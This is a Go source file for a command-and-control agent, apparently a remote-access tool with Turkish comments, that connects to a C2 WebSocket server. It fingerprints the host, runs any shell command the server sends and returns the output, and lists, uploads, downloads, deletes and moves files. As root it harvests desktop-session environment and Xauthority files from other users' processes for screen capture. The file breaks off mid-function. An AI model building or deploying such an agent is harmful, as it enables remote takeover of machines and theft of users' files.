package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"image/png"
	"io"
	"io/fs"
	"net/http"
	"log"
	"net"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ===== Ayarlar =====
const (
	heartbeatInterval = 10 * time.Second
	reconnectDelay    = 5 * time.Second
	maxFileSize       = 50 * 1024 * 1024 // 50MB
)

var (
	agentID           string
	conn              *websocket.Conn
	connMu            sync.Mutex
	cachedFingerprint string
	cachedSystemInfo  map[string]interface{}
	isWindows         = runtime.GOOS == "windows"
	screenMu       sync.Mutex
	screenStopCh   chan struct{}
	screenStreaming bool

	// CPU usage tracking
	prevCPUIdle  uint64
	prevCPUTotal uint64
)

// ===== CLI Parsing =====
func parseServerURL() string {
	args := os.Args[1:]
	for i, arg := range args {
		if arg == "--server" && i+1 < len(args) {
			return normalizeURL(args[i+1])
		}
	}
	if env := os.Getenv("C2_SERVER"); env != "" {
		return normalizeURL(env)
	}
	return "ws://localhost:4444/ws/agent"
}

func normalizeURL(raw string) string {
	if strings.HasPrefix(raw, "https://") {
		raw = "wss://" + raw[len("https://"):]
	} else if strings.HasPrefix(raw, "http://") {
		raw = "ws://" + raw[len("http://"):]
	}
	if !strings.HasPrefix(raw, "ws://") && !strings.HasPrefix(raw, "wss://") {
		raw = "wss://" + raw
	}
	raw = strings.TrimRight(raw, "/")
	if !strings.HasSuffix(raw, "/ws/agent") {
		raw += "/ws/agent"
	}
	return raw
}

// ===== System Info =====
func getHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

func getUsername() string {
	u, err := user.Current()
	if err != nil {
		return "unknown"
	}
	return u.Username
}

func getRealUsername() string {
	current := getUsername()
	if isWindows || current != "root" {
		return current
	}

	// SUDO_USER
	if su := os.Getenv("SUDO_USER"); su != "" && su != "root" {
		return su
	}

	// logname
	if out, err := exec.Command("logname").Output(); err == nil {
		name := strings.TrimSpace(string(out))
		if name != "" && name != "root" {
			return name
		}
	}

	// who
	if out, err := exec.Command("who").Output(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			fields := strings.Fields(line)
			if len(fields) > 0 && fields[0] != "root" {
				return fields[0]
			}
		}
	}

	// /etc/passwd — UID >= 1000
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.Split(line, ":")
			if len(parts) >= 7 {
				uid := 0
				fmt.Sscanf(parts[2], "%d", &uid)
				shell := parts[6]
				if uid >= 1000 && uid < 65534 && !strings.Contains(shell, "nologin") && !strings.Contains(shell, "false") {
					return parts[0]
				}
			}
		}
	}

	return current
}

func getOSInfo() string {
	return fmt.Sprintf("%s %s (%s)", runtime.GOOS, getKernelVersion(), runtime.GOARCH)
}

func getKernelVersion() string {
	if isWindows {
		if out, err := exec.Command("cmd", "/c", "ver").Output(); err == nil {
			s := strings.TrimSpace(string(out))
			if s != "" {
				return s
			}
		}
		return "unknown"
	}
	if out, err := exec.Command("uname", "-r").Output(); err == nil {
		return strings.TrimSpace(string(out))
	}
	return "unknown"
}

func getIPAndMAC() (string, string) {
	ip, mac := "unknown", "unknown"
	ifaces, err := net.Interfaces()
	if err != nil {
		return ip, mac
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		hwAddr := iface.HardwareAddr.String()
		if hwAddr != "" && hwAddr != "00:00:00:00:00:00" {
			if mac == "unknown" {
				mac = hwAddr
			}
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil && ip == "unknown" {
					ip = ipnet.IP.String()
				}
			}
		}
	}
	return ip, mac
}

func getMachineID() string {
	if isWindows {
		out, err := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Cryptography`, "/v", "MachineGuid").Output()
		if err == nil {
			lines := strings.Split(string(out), "\n")
			for _, line := range lines {
				if strings.Contains(line, "MachineGuid") {
					fields := strings.Fields(line)
					if len(fields) >= 3 {
						return fields[len(fields)-1]
					}
				}
			}
		}
		return "unknown"
	}
	for _, p := range []string{"/etc/machine-id", "/var/lib/dbus/machine-id"} {
		if data, err := os.ReadFile(p); err == nil {
			id := strings.TrimSpace(string(data))
			if id != "" {
				return id
			}
		}
	}
	return "unknown"
}

func getCPUModel() string {
	if isWindows {
		out, err := exec.Command("wmic", "cpu", "get", "Name", "/format:list").Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				if strings.HasPrefix(line, "Name=") {
					return strings.TrimSpace(strings.TrimPrefix(line, "Name="))
				}
			}
		}
		return "unknown"
	}
	if data, err := os.ReadFile("/proc/cpuinfo"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "model name") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}
	return "unknown"
}

func getTotalMemMB() int {
	if isWindows {
		out, err := exec.Command("wmic", "OS", "get", "TotalVisibleMemorySize", "/format:list").Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				if strings.HasPrefix(line, "TotalVisibleMemorySize=") {
					val := strings.TrimSpace(strings.TrimPrefix(line, "TotalVisibleMemorySize="))
					var kb int
					fmt.Sscanf(val, "%d", &kb)
					return kb / 1024
				}
			}
		}
		return 0
	}
	if data, err := os.ReadFile("/proc/meminfo"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "MemTotal:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 {
					var kb int
					fmt.Sscanf(fields[1], "%d", &kb)
					return kb / 1024
				}
			}
		}
	}
	return 0
}

func getFingerprint(machineID, mac string) string {
	if cachedFingerprint != "" {
		return cachedFingerprint
	}

	var fpDir, fpFile string
	if isWindows {
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			appdata = `C:\ProgramData`
		}
		fpDir = filepath.Join(appdata, "kovan")
		fpFile = filepath.Join(fpDir, "fingerprint")
	} else {
		home := os.Getenv("HOME")
		if home == "" {
			home = "/tmp"
		}
		fpDir = filepath.Join(home, ".kovan")
		fpFile = filepath.Join(fpDir, "fingerprint")
	}

	// Read existing
	if data, err := os.ReadFile(fpFile); err == nil {
		existing := strings.TrimSpace(string(data))
		if len(existing) >= 16 {
			cachedFingerprint = existing
			log.Printf("[AGENT] fingerprint dosyadan okundu: %s...", existing[:8])
			return cachedFingerprint
		}
	}

	// Generate new
	var fp string
	if machineID != "unknown" || mac != "unknown" {
		h := sha256.Sum256([]byte(machineID + ":" + mac))
		fp = fmt.Sprintf("%x", h[:16])
	} else {
		// Random fallback
		h := sha256.Sum256([]byte(fmt.Sprintf("%d-%s", time.Now().UnixNano(), getHostname())))
		fp = fmt.Sprintf("%x", h[:16])
	}

	// Persist
	os.MkdirAll(fpDir, 0700)
	if err := os.WriteFile(fpFile, []byte(fp), 0600); err != nil {
		log.Printf("[AGENT] fingerprint dosyasi yazilamadi: %v", err)
	} else {
		log.Printf("[AGENT] fingerprint olusturuldu: %s", fpFile)
	}

	cachedFingerprint = fp
	return fp
}

func getPublicIP() string {
	services := []string{
		"https://api.ipify.org",
		"https://ifconfig.me/ip",
		"https://icanhazip.com",
	}
	client := &http.Client{Timeout: 5 * time.Second}
	for _, svc := range services {
		resp, err := client.Get(svc)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		ip := strings.TrimSpace(string(body))
		if ip != "" && net.ParseIP(ip) != nil {
			log.Printf("[AGENT] public IP: %s (via %s)", ip, svc)
			return ip
		}
	}
	return ""
}

func getSystemInfo() map[string]interface{} {
	if cachedSystemInfo != nil {
		return cachedSystemInfo
	}

	localIP, mac := getIPAndMAC()
	machineID := getMachineID()

	// Public IP'yi al, başarısızsa local IP kullan
	ip := getPublicIP()
	if ip == "" {
		ip = localIP
	}

	cachedSystemInfo = map[string]interface{}{
		"hostname":    getHostname(),
		"username":    getRealUsername(),
		"os":          getOSInfo(),
		"ip":          ip,
		"mac":         mac,
		"machineId":   machineID,
		"cpuModel":    getCPUModel(),
		"totalMemMB":  getTotalMemMB(),
		"fingerprint": getFingerprint(machineID, mac),
	}
	return cachedSystemInfo
}

// ===== Metrics =====
func getCPUUsage() int {
	if isWindows {
		out, err := exec.Command("wmic", "cpu", "get", "LoadPercentage", "/format:list").Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				if strings.HasPrefix(line, "LoadPercentage=") {
					val := strings.TrimSpace(strings.TrimPrefix(line, "LoadPercentage="))
					var pct int
					fmt.Sscanf(val, "%d", &pct)
					return pct
				}
			}
		}
		return 0
	}

	// Linux: /proc/stat
	data, err := os.ReadFile("/proc/stat")
	if err != nil {
		return 0
	}
	lines := strings.Split(string(data), "\n")
	if len(lines) == 0 {
		return 0
	}
	fields := strings.Fields(lines[0])
	if len(fields) < 5 {
		return 0
	}

	var vals [7]uint64
	for i := 1; i < len(fields) && i <= 7; i++ {
		fmt.Sscanf(fields[i], "%d", &vals[i-1])
	}
	idle := vals[3]
	total := vals[0] + vals[1] + vals[2] + vals[3] + vals[4] + vals[5] + vals[6]

	if prevCPUTotal == 0 {
		prevCPUIdle = idle
		prevCPUTotal = total
		return 0
	}

	idleDiff := idle - prevCPUIdle
	totalDiff := total - prevCPUTotal
	prevCPUIdle = idle
	prevCPUTotal = total

	if totalDiff == 0 {
		return 0
	}
	return int((1.0 - float64(idleDiff)/float64(totalDiff)) * 100)
}

func getMemInfo() (usedMB, totalMB, percent int) {
	if isWindows {
		// Total
		total := getTotalMemMB()
		if total == 0 {
			return 0, 0, 0
		}
		// Free
		out, err := exec.Command("wmic", "OS", "get", "FreePhysicalMemory", "/format:list").Output()
		if err != nil {
			return 0, total, 0
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "FreePhysicalMemory=") {
				val := strings.TrimSpace(strings.TrimPrefix(line, "FreePhysicalMemory="))
				var freeKB int
				fmt.Sscanf(val, "%d", &freeKB)
				freeMB := freeKB / 1024
				used := total - freeMB
				pct := 0
				if total > 0 {
					pct = used * 100 / total
				}
				return used, total, pct
			}
		}
		return 0, total, 0
	}

	// Linux: /proc/meminfo
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, 0, 0
	}
	var memTotal, memAvailable int
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fmt.Sscanf(strings.Fields(line)[1], "%d", &memTotal)
		} else if strings.HasPrefix(line, "MemAvailable:") {
			fmt.Sscanf(strings.Fields(line)[1], "%d", &memAvailable)
		}
	}
	totalMB = memTotal / 1024
	usedMB = (memTotal - memAvailable) / 1024
	if totalMB > 0 {
		percent = usedMB * 100 / totalMB
	}
	return
}

func getDiskUsage() (usedGB, totalGB float64, percent int) {
	if isWindows {
		out, err := exec.Command("wmic", "logicaldisk", "where", "DriveType=3", "get", "Size,FreeSpace", "/format:csv").Output()
		if err != nil {
			return
		}
		var totalBytes, freeBytes uint64
		for _, line := range strings.Split(string(out), "\n") {
			parts := strings.Split(strings.TrimSpace(line), ",")
			if len(parts) >= 3 {
				var free, total uint64
				fmt.Sscanf(parts[1], "%d", &free)
				fmt.Sscanf(parts[2], "%d", &total)
				if total > 0 {
					freeBytes += free
					totalBytes += total
				}
			}
		}
		if totalBytes > 0 {
			totalGB = float64(totalBytes) / (1024 * 1024 * 1024)
			usedGB = float64(totalBytes-freeBytes) / (1024 * 1024 * 1024)
			percent = int((1.0 - float64(freeBytes)/float64(totalBytes)) * 100)
			totalGB = float64(int(totalGB*10)) / 10
			usedGB = float64(int(usedGB*10)) / 10
		}
		return
	}

	out, err := exec.Command("df", "-B1", "/").Output()
	if err != nil {
		return
	}
	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	if len(lines) < 2 {
		return
	}
	fields := strings.Fields(lines[len(lines)-1])
	if len(fields) < 4 {
		return
	}
	var total, used uint64
	fmt.Sscanf(fields[1], "%d", &total)
	fmt.Sscanf(fields[2], "%d", &used)
	if total > 0 {
		totalGB = float64(int(float64(total)/(1024*1024*1024)*10)) / 10
		usedGB = float64(int(float64(used)/(1024*1024*1024)*10)) / 10
		percent = int(float64(used) / float64(total) * 100)
	}
	return
}

func getGPUInfo() map[string]interface{} {
	out, err := exec.Command("nvidia-smi", "--query-gpu=utilization.gpu,utilization.memory,name", "--format=csv,noheader,nounits").Output()
	if err != nil {
		return nil
	}
	parts := strings.Split(strings.TrimSpace(string(out)), ",")
	if len(parts) < 3 {
		return nil
	}
	var gpuPct, memPct int
	fmt.Sscanf(strings.TrimSpace(parts[0]), "%d", &gpuPct)
	fmt.Sscanf(strings.TrimSpace(parts[1]), "%d", &memPct)
	return map[string]interface{}{
		"gpuPercent":    gpuPct,
		"gpuMemPercent": memPct,
		"gpuName":       strings.TrimSpace(parts[2]),
	}
}

func getLoadAvg() []float64 {
	if isWindows {
		return nil
	}
	data, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return nil
	}
	fields := strings.Fields(string(data))
	if len(fields) < 3 {
		return nil
	}
	result := make([]float64, 3)
	for i := 0; i < 3; i++ {
		fmt.Sscanf(fields[i], "%f", &result[i])
		result[i] = float64(int(result[i]*100)) / 100
	}
	return result
}

func getUptime() int {
	if isWindows {
		out, err := exec.Command("wmic", "os", "get", "LastBootUpTime", "/format:list").Output()
		if err != nil {
			return 0
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "LastBootUpTime=") {
				// Format: 20260221140000.000000+180
				val := strings.TrimSpace(strings.TrimPrefix(line, "LastBootUpTime="))
				if len(val) >= 14 {
					t, err := time.Parse("20060102150405", val[:14])
					if err == nil {
						return int(time.Since(t).Seconds())
					}
				}
			}
		}
		return 0
	}
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return 0
	}
	var uptime float64
	fmt.Sscanf(string(data), "%f", &uptime)
	return int(uptime)
}

func collectMetrics() map[string]interface{} {
	usedMem, totalMem, memPct := getMemInfo()
	diskUsed, diskTotal, diskPct := getDiskUsage()

	metrics := map[string]interface{}{
		"timestamp":  time.Now().UTC().Format(time.RFC3339),
		"cpuPercent": getCPUUsage(),
		"memUsedMB":  usedMem,
		"memTotalMB": totalMem,
		"memPercent": memPct,
		"diskUsedGB": diskUsed,
		"diskTotalGB": diskTotal,
		"diskPercent": diskPct,
		"uptime":     getUptime(),
	}

	if loadAvg := getLoadAvg(); loadAvg != nil {
		metrics["loadAvg"] = loadAvg
	}

	if gpu := getGPUInfo(); gpu != nil {
		for k, v := range gpu {
			metrics[k] = v
		}
	}

	return metrics
}

// ===== Command Execution =====
func executeCommand(commandID, command string) {
	log.Printf("[AGENT] komut calistiriliyor: %s", command)

	var cmd *exec.Cmd
	if isWindows {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	stdout, err := cmd.Output()
	output := string(stdout)

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			stderr := string(exitErr.Stderr)
			if stderr != "" {
				output += "\n[STDERR] " + stderr
			}
			sendMessage(map[string]interface{}{
				"type":    "result",
				"agentId": agentID,
				"data": map[string]interface{}{
					"commandId": commandID,
					"output":    output,
					"error":     stderr,
				},
			})
		} else {
			sendMessage(map[string]interface{}{
				"type":    "result",
				"agentId": agentID,
				"data": map[string]interface{}{
					"commandId": commandID,
					"output":    "",
					"error":     err.Error(),
				},
			})
		}
	} else {
		sendMessage(map[string]interface{}{
			"type":    "result",
			"agentId": agentID,
			"data": map[string]interface{}{
				"commandId": commandID,
				"output":    output,
			},
		})
	}

	log.Printf("[AGENT] komut tamamlandi: %s", commandID)
}

// ===== File Manager =====
func handleFileList(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	dirPath, _ := data["path"].(string)

	if dirPath == "" {
		if isWindows {
			dirPath = os.Getenv("USERPROFILE")
			if dirPath == "" {
				dirPath = `C:\Users`
			}
		} else {
			dirPath = os.Getenv("HOME")
			if dirPath == "" {
				dirPath = "/home"
			}
		}
	}

	entries, err := os.ReadDir(dirPath)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type":    "file_list_result",
			"agentId": agentID,
			"data": map[string]interface{}{
				"requestId": requestID,
				"path":      dirPath,
				"entries":   []interface{}{},
				"error":     err.Error(),
			},
		})
		return
	}

	type fileEntry struct {
		Name        string `json:"name"`
		Path        string `json:"path"`
		IsDirectory bool   `json:"isDirectory"`
		Size        int64  `json:"size"`
		Modified    string `json:"modified"`
		Permissions string `json:"permissions,omitempty"`
	}

	var result []fileEntry
	for _, e := range entries {
		fullPath := filepath.Join(dirPath, e.Name())
		info, err := os.Stat(fullPath)
		if err != nil {
			continue
		}
		entry := fileEntry{
			Name:        e.Name(),
			Path:        fullPath,
			IsDirectory: info.IsDir(),
			Size:        info.Size(),
			Modified:    info.ModTime().UTC().Format(time.RFC3339),
		}
		if !isWindows {
			entry.Permissions = fmt.Sprintf("%o", info.Mode().Perm())
		}
		result = append(result, entry)
	}

	// Sort: directories first, then by name
	sort.Slice(result, func(i, j int) bool {
		if result[i].IsDirectory != result[j].IsDirectory {
			return result[i].IsDirectory
		}
		return result[i].Name < result[j].Name
	})

	sendMessage(map[string]interface{}{
		"type":    "file_list_result",
		"agentId": agentID,
		"data": map[string]interface{}{
			"requestId": requestID,
			"path":      dirPath,
			"entries":   result,
		},
	})
	log.Printf("[AGENT] dizin listelendi: %s (%d oge)", dirPath, len(result))
}

func handleFileDownload(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	filePath, _ := data["path"].(string)

	info, err := os.Stat(filePath)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_download_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "fileName": "", "data": "", "size": 0, "error": err.Error()},
		})
		return
	}

	if info.Size() > maxFileSize {
		sendMessage(map[string]interface{}{
			"type": "file_download_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "fileName": "", "data": "", "size": 0, "error": "Dosya çok büyük (max 50MB)"},
		})
		return
	}

	content, err := os.ReadFile(filePath)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_download_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "fileName": "", "data": "", "size": 0, "error": err.Error()},
		})
		return
	}

	sendMessage(map[string]interface{}{
		"type": "file_download_result", "agentId": agentID,
		"data": map[string]interface{}{
			"requestId": requestID,
			"path":      filePath,
			"fileName":  filepath.Base(filePath),
			"data":      base64.StdEncoding.EncodeToString(content),
			"size":      info.Size(),
		},
	})
	log.Printf("[AGENT] dosya indirildi: %s (%d bytes)", filePath, info.Size())
}

func handleFileUpload(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	filePath, _ := data["path"].(string)
	b64Data, _ := data["data"].(string)

	content, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_upload_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": false, "error": err.Error()},
		})
		return
	}

	os.MkdirAll(filepath.Dir(filePath), 0755)
	if err := os.WriteFile(filePath, content, 0644); err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_upload_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": false, "error": err.Error()},
		})
		return
	}

	sendMessage(map[string]interface{}{
		"type": "file_upload_result", "agentId": agentID,
		"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": true},
	})
	log.Printf("[AGENT] dosya yuklendi: %s", filePath)
}

func handleFileDelete(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	filePath, _ := data["path"].(string)

	info, err := os.Stat(filePath)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_delete_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": false, "error": err.Error()},
		})
		return
	}

	if info.IsDir() {
		err = os.RemoveAll(filePath)
	} else {
		err = os.Remove(filePath)
	}

	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_delete_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": false, "error": err.Error()},
		})
		return
	}

	sendMessage(map[string]interface{}{
		"type": "file_delete_result", "agentId": agentID,
		"data": map[string]interface{}{"requestId": requestID, "path": filePath, "success": true},
	})
	log.Printf("[AGENT] dosya silindi: %s", filePath)
}

func handleFileMove(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	source, _ := data["source"].(string)
	dest, _ := data["destination"].(string)

	err := os.Rename(source, dest)
	success := err == nil
	result := map[string]interface{}{
		"requestId": requestID, "source": source, "destination": dest, "success": success,
	}
	if err != nil {
		result["error"] = err.Error()
	}
	sendMessage(map[string]interface{}{"type": "file_move_result", "agentId": agentID, "data": result})
	if success {
		log.Printf("[AGENT] dosya tasindi: %s -> %s", source, dest)
	}
}

func handleFileCopy(data map[string]interface{}) {
	requestID, _ := data["requestId"].(string)
	source, _ := data["source"].(string)
	dest, _ := data["destination"].(string)

	info, err := os.Stat(source)
	if err != nil {
		sendMessage(map[string]interface{}{
			"type": "file_copy_result", "agentId": agentID,
			"data": map[string]interface{}{"requestId": requestID, "source": source, "destination": dest, "success": false, "error": err.Error()},
		})
		return
	}

	if info.IsDir() {
		err = copyDir(source, dest)
	} else {
		err = copyFile(source, dest)
	}

	success := err == nil
	result := map[string]interface{}{
		"requestId": requestID, "source": source, "destination": dest, "success": success,
	}
	if err != nil {
		result["error"] = err.Error()
	}
	sendMessage(map[string]interface{}{"type": "file_copy_result", "agentId": agentID, "data": result})
	if success {
		log.Printf("[AGENT] dosya kopyalandi: %s -> %s", source, dest)
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func copyDir(src, dst string) error {
	return filepath.WalkDir(src, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dst, rel)
		if d.IsDir() {
			return os.MkdirAll(target, 0755)
		}
		return copyFile(path, target)
	})
}

// ===== Screen Streaming (Screenshot-based) =====

// ensureFFmpeg checks if ffmpeg exists on Linux, installs it if missing
func ensureFFmpeg() bool {
	if _, err := exec.LookPath("ffmpeg"); err == nil {
		return true
	}
	if isWindows {
		return false
	}
	log.Println("[SCREEN] ffmpeg bulunamadı, kuruluyor...")

	// Try apt (Debian/Ubuntu/Pardus)
	cmd := exec.Command("sudo", "apt", "install", "-y", "ffmpeg")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		log.Printf("[SCREEN] ffmpeg kurulumu başarısız (apt): %v", err)
		return false
	}

	// Verify
	if _, err := exec.LookPath("ffmpeg"); err == nil {
		log.Println("[SCREEN] ffmpeg başarıyla kuruldu")
		return true
	}
	return false
}

// cachedSessionEnv stores discovered desktop session environment (for root/service usage)
var cachedSessionEnv []string

// findXauthority tries to locate the .Xauthority file for a given user
func findXauthority(username string) string {
	// 1. Check env
	if xa := os.Getenv("XAUTHORITY"); xa != "" {
		if _, err := os.Stat(xa); err == nil {
			return xa
		}
	}

	// 2. Common paths
	candidates := []string{}
	if username != "" && username != "root" {
		candidates = append(candidates, "/home/"+username+"/.Xauthority")
	}
	candidates = append(candidates,
		"/root/.Xauthority",
		"/run/user/1000/.mutter-Xwaylandauth.*", // GNOME Wayland XWayland auth
	)

	for _, c := range candidates {
		if strings.Contains(c, "*") {
			// Glob pattern
			matches, _ := filepath.Glob(c)
			if len(matches) > 0 {
				return matches[0]
			}
		} else {
			if _, err := os.Stat(c); err == nil {
				return c
			}
		}
	}

	// 3. Search /run/user/*/  for .Xauthority or mutter-Xwaylandauth
	runUsers, _ := filepath.Glob("/run/user/*")
	for _, dir := range runUsers {
		// Skip root (uid 0)
		if strings.HasSuffix(dir, "/0") {
			continue
		}
		for _, pattern := range []string{".Xauthority", ".mutter-Xwaylandauth.*"} {
			matches, _ := filepath.Glob(filepath.Join(dir, pattern))
			if len(matches) > 0 {
				return matches[0]
			}
		}
	}

	return ""
}

// discoverDesktopSessionEnv finds the real desktop user's session environment variables
// This is critical when agent runs as root/systemd service — it won't have DISPLAY, DBUS etc.
// Scans /proc/*/environ of gnome-shell/gnome-session to find the active desktop session.
// Also discovers XAUTHORITY which is REQUIRED for X11 screen capture (prevents black screen).
func discoverDesktopSessionEnv() []string {
	if cachedSessionEnv != nil {
		return cachedSessionEnv
	}

	log.Println("[SCREEN] Masaüstü oturumu keşfediliyor...")

	// Always scan /proc for the desktop session — even if we have DISPLAY,
	// we might be missing XAUTHORITY which causes black screen on X11
	targets := []string{"gnome-shell", "gnome-session", "xfce4-session", "plasmashell", "cinnamon", "mate-session"}
	var foundEnvMap map[string]string
	var foundTarget, foundPid string

	procs, err := os.ReadDir("/proc")
	if err != nil {
		log.Printf("[SCREEN] /proc okunamadı: %v", err)
		cachedSessionEnv = os.Environ()
		return cachedSessionEnv
	}

	for _, target := range targets {
		if foundEnvMap != nil {
			break
		}
		for _, p := range procs {
			if !p.IsDir() {
				continue
			}
			pid := p.Name()
			isNum := true
			for _, c := range pid {
				if c < '0' || c > '9' {
					isNum = false
					break
				}
			}
			if !isNum {
				continue
			}

			cmdline, err := os.ReadFile("/proc/" + pid + "/cmdline")
			if err != nil {
				continue
			}
			if !strings.Contains(string(cmdline), target) {
				continue
			}

			envData, err := os.ReadFile("/proc/" + pid + "/environ")
			if err != nil {
				continue
			}

			envVars := strings.Split(string(envData), "\x00")
			envMap := make(map[string]string)
			for _, e := range envVars {
				parts := strings.SplitN(e, "=", 2)
				if len(parts) == 2 {
					envMap[parts[0]] = parts[1]
				}
			}

			if envMap["DISPLAY"] == "" && envMap["WAYLAND_DISPLAY"] == "" {
				continue
			}

			foundEnvMap = envMap
			foundTarget = target
			foundPid = pid
			break
		}
	}

	// Build result env
	result := os.Environ()

	if foundEnvMap != nil {
		log.Printf("[SCREEN] Masaüstü oturumu bulundu: PID=%s (%s) DISPLAY=%s WAYLAND_DISPLAY=%s",
			foundPid, foundTarget, foundEnvMap["DISPLAY"], foundEnvMap["WAYLAND_DISPLAY"])

		// Session-critical variables — XAUTHORITY is the key for X11!
		sessionVars := map[string]string{
			"DISPLAY":                  foundEnvMap["DISPLAY"],
			"WAYLAND_DISPLAY":          foundEnvMap["WAYLAND_DISPLAY"],
			"DBUS_SESSION_BUS_ADDRESS": foundEnvMap["DBUS_SESSION_BUS_ADDRESS"],
			"XDG_RUNTIME_DIR":          foundEnvMap["XDG_RUNTIME_DIR"],
			"XDG_SESSION_TYPE":         foundEnvMap["XDG_SESSION_TYPE"],
			"XAUTHORITY":              foundEnvMap["XAUTHORITY"],
			"HOME":                     foundEnvMap["HOME"],
			"USER":                     foundEnvMap["USER"],
		}

		// If XAUTHORITY not in process env, find it
		if sessionVars["XAUTHORITY"] == "" {
			xa := findXauthority(foundEnvMap["USER"])
			if xa != "" {
				sessionVars["XAUTHORITY"] = xa
				log.Printf("[SCREEN] XAUTHORITY keşfedildi: %s", xa)
			} else {
				log.Println("[SCREEN] ⚠ XAUTHORITY bulunamadı — X11'de siyah ekran olabilir!")
			}
		} else {
			log.Printf("[SCREEN] XAUTHORITY process env'den: %s", sessionVars["XAUTHORITY"])
		}

		for k, v := range sessionVars {
			if v == "" {
				continue
			}
			found := false
			for i, e := range result {
				if strings.HasPrefix(e, k+"=") {
					result[i] = k + "=" + v
					found = true
					break
				}
			}
			if !found {
				result = append(result, k+"="+v)
			}
		}
	} else {
		log.Println("[SCREEN] Masaüstü oturumu bulunamadı, mevcut env kullanılacak")

		// Still try to find XAUTHORITY even without process discovery
		if os.Getenv("XAUTHORITY") == "" {
			xa := findXauthority(getRealUsername())
			if xa != "" {
				result = append(result, "XAUTHORITY="+xa)
				log.Printf("[SCREEN] XAUTHORITY dosyadan bulundu: %s", xa)
			}
		}
	}

	// Log final critical env vars
	for _, e := range result {
		for _, key := range []string{"DISPLAY=", "XAUTHORITY=", "WAYLAND_DISPLAY=", "XDG_SESSION_TYPE="} {
			if strings.HasPrefix(e, key) {
				log.Printf("[SCREEN] ENV: %s", e)
			}
		}
	}

	cachedSessionEnv = result
	return cachedSessionEnv
}

// getEnvFromSession reads a specific env var from discovered session env
func getEnvFromSession(key string) string {
	env := discoverDesktopSessionEnv()
	prefix := key + "="
	for _, e := range env {
		if strings.HasPrefix(e, prefix) {
			return e[len(prefix):]
		}
	}
	return ""
}

// getDisplayInfo returns DISPLAY env and screen resolution for X11
func getDisplayInfo() (display string, width, height int) {
	display = getEnvFromSession("DISPLAY")
	if display == "" {
		display = ":0"
	}
	// Ensure :0.0 format
	if !strings.Contains(display, ".") {
		display = display + ".0"
	}
	width, height = 1920, 1080 // defaults

	sessionEnv := discoverDesktopSessionEnv()

	// Try xdpyinfo for actual resolution
	cmd := exec.Command("xdpyinfo")
	cmd.Env = sessionEnv
	out, err := cmd.Output()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "dimensions:") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					dim := strings.Split(parts[1], "x")
					if len(dim) == 2 {
